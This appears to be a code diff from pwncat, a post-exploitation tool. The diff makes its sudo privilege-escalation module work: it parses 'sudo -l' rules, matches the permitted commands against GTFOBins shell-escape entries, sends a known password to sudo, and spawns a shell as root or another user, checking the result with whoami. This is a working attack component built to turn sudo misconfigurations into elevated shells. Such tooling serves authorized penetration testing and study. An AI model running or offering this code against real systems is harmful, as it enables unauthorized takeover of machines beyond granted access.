@@ -11,6 +11,7 @@ from pwncat.util import info, success, error, progress, warn, CTRL_C
 from pwncat.privesc.base import Method, PrivescError, Technique
 
 from pwncat.pysudoers import Sudoers
+from pwncat import gtfobins
 
 
 class SudoMethod(Method):
@@ -21,11 +22,8 @@ class SudoMethod(Method):
     def __init__(self, pty: "pwncat.pty.PtyHandler"):
         super(SudoMethod, self).__init__(pty)
 
-        self.sudo_rules = None
-
     def find_sudo(self):
 
-        self.pty.current_user["password"] = "password"
         current_user = self.pty.current_user
 
         # Process the prompt but it will not wait for the end of the output
@@ -38,6 +36,9 @@ class SudoMethod(Method):
 
             if current_user["password"] is None:
                 self.pty.client.send(CTRL_C)  # break out of password prompt
+                error(
+                    f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
+                )
                 raise PrivescError(
                     f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
                 )
@@ -107,45 +108,23 @@ class SudoMethod(Method):
 
         return sudoers.rules
 
-        """
-
-        for each rule
-            have a function that maps a command to a GTFObins action
-            for each user
-                if user is ALL:
-                    yield technique with root
-                else:
-                    yield a technique
-
-
-        First look for things with NOPASSWD
-        If there are no NOPASSWD set and you have no password known, then fail
-
-        Then look for ALL, if there are any ALL and you DO know a password,
-        pick the first of the list of the GTFObins commands that actually resolve with which
-
-        For all others, check the command set it specifies, and if they overlap with the 
-        GTFObins list, then yield those
-
-        Anything that specifies specific users, yield a technique with each user
-
-        """
-
     def enumerate(self) -> List[Technique]:
         """ Find all techniques known at this time """
 
         info(f"checking {Fore.YELLOW}sudo -l{Fore.RESET} output", overlay=True)
-        if self.sudo_rules is None:
-            self.sudo_rules = self.find_sudo()
 
-        if not self.sudo_rules:
+        sudo_rules = self.find_sudo()
+
+        current_user = self.pty.current_user
+
+        if not sudo_rules:
             return []
 
         sudo_no_password = []
         sudo_all_users = []
         sudo_other_commands = []
 
-        for rule in self.sudo_rules:
+        for rule in sudo_rules:
             for commands in rule["commands"]:
 
                 if commands["tags"] is None:
@@ -169,55 +148,125 @@ class SudoMethod(Method):
                         f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} can run "
                         + f"{Fore.YELLOW}{command}{Fore.RESET} "
                         + f"as user {Fore.BLUE}{run_as_user}{Fore.RESET} "
-                        + f"with {Fore.BLUE}{tag}{Fore.RESET}"
+                        + f"with {Fore.BLUE}{tag}{Fore.RESET}",
+                        overlay=True,
                     )
 
                 if "NOPASSWD" in tag:
                     sudo_no_password.append(
-                        {"run_as_user": run_as_user, "command": command}
+                        {
+                            "run_as_user": run_as_user,
+                            "command": command,
+                            "password": False,
+                        }
                     )
 
                 if "ALL" in run_as_user:
-                    sudo_all_users.append({"run_as_user": "root", "command": command})
+                    sudo_all_users.append(
+                        {"run_as_user": "root", "command": command, "password": True}
+                    )
 
                 else:
                     sudo_other_commands.append(
-                        {"run_as_user": run_as_user, "command": command}
+                        {
+                            "run_as_user": run_as_user,
+                            "command": command,
+                            "password": True,
+                        }
                     )
 
-        return
+        current_user = self.pty.current_user
 
-        # yield Technique(user, self, (path, name, cmd))
-        # return
+        techniques = []
+        for sudo_privesc in [*sudo_no_password, *sudo_all_users, *sudo_other_commands]:
+            if current_user["password"] is None and sudo_privesc["password"]:
+                continue
+
+            if sudo_privesc["command"] == "ALL":
+                command_path = self.pty.shell
+            else:
+                command_path = shlex.split(sudo_privesc["command"])[0]
+
+            binary = gtfobins.Binary.find(command_path)
+            if binary is None or binary.shell("") is None:
+                continue
+            if sudo_privesc["command"] == "ALL" and binary.shell("") is None:
+                continue
+            if sudo_privesc["command"] != "ALL" and binary.sudo("", "", "") is None:
+                continue
+
+            if sudo_privesc["run_as_user"] == "ALL":
+                # add a technique for root
+                techniques.append(
+                    Technique(
+                        "root",
+                        self,
+                        (binary, sudo_privesc["command"], sudo_privesc["password"]),
+                    )
+                )
+            else:
+                users = sudo_privesc["run_as_user"].split(",")
+                for u in users:
+                    techniques.append(
+                        Technique(
+                            u,
+                            self,
+                            (binary, sudo_privesc["command"], sudo_privesc["password"]),
+                        )
+                    )
+
+        return techniques
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
 
-        path, name, commands = technique.ident
+        current_user = self.pty.current_user
+
+        binary, command, password_required = technique.ident
 
         info(
-            f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{path}{Style.RESET_ALL}",
+            f"attempting potential privesc with sudo {Fore.GREEN}{Style.BRIGHT}{binary.path}{Style.RESET_ALL}",
         )
 
         before_shell_level = self.pty.run("echo $SHLVL").strip()
         before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0
-        return
-        # # Run the start commands
-        # self.pty.run(commands[0].format(path) + "\n")
 
-        # # sleep(0.1)
-        # user = self.pty.run("whoami").strip().decode("utf-8")
-        # if user == technique.user:
-        #     success("privesc succeeded")
-        #     return commands[1]
-        # else:
-        #     error(f"privesc failed (still {user} looking for {technique.user})")
-        #     after_shell_level = self.pty.run("echo $SHLVL").strip()
-        #     after_shell_level = (
-        #         int(after_shell_level) if after_shell_level != b"" else 0
-        #     )
-        #     if after_shell_level > before_shell_level:
-        #         info("exiting spawned inner shell")
-        #         self.pty.run(commands[1], wait=False)  # here be dragons
+        sudo_prefix = f"sudo -u {technique.user} "
+        if command == "ALL":
 
-        # raise PrivescError(f"escalation failed for {technique}")
+            shell_payload, input, exit = binary.shell(
+                self.pty.shell, sudo_prefix=sudo_prefix
+            )
+        else:
+            payload, input, exit = binary.sudo(sudo_prefix, command, self.pty.shell)
+            shell_payload = f" {payload}"
+
+        # Run the commands
+        self.pty.run(shell_payload + "\n", wait=False)
+
+        if password_required:
+            self.pty.client.send(current_user["password"].encode("utf-8") + b"\n")
+
+        # Provide stdin if needed
+        self.pty.client.send(input.encode("utf-8"))
+
+        # Give it a bit to let the shell start
+        self.pty.run("echo")
+
+        user = self.pty.whoami()
+        if user == technique.user:
+            success("privesc succeeded")
+            return exit
+        else:
+            error(f"privesc failed (still {user} looking for {technique.user})")
+
+            after_shell_level = self.pty.run("echo $SHLVL").strip()
+            after_shell_level = (
+                int(after_shell_level) if after_shell_level != b"" else 0
+            )
+
+            if after_shell_level > before_shell_level:
+                info("exiting spawned inner shell")
+                self.pty.run(exit, wait=False)  # here be dragons
+
+        raise PrivescError("failed to privesc")
